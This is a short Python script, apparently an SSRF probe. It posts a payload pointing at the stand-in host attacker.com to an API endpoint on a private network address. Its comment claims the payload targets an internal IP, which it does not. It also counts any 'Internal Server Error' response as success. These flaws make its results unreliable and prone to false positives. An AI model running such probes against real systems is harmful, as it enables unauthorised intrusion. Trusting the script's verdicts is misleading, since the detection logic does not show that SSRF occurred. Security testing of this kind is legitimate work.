import requests

# Target URL provided by the user
target_url = "http://192.168.2.69:3000/api/v1/data"

def test_ssrf_vulnerability():
    # Potential SSRF payload that tries to access an internal IP address
    payload = {"url": "http://attacker.com/status"}

    try:
        response = requests.post(target_url, data=payload)
        
        # Check if the response contains a specific success signal
        if "Internal Server Error" in response.text:
            print("RESULT: SUCCESS - Response contains expected error message.")
        else:
            print("RESULT: NO_SIGNAL")
    except requests.exceptions.RequestException as e:
        print(f"An exception occurred: {e}")
        print("RESULT: NO_SIGNAL")

if __name__ == "__main__":
    test_ssrf_vulnerability()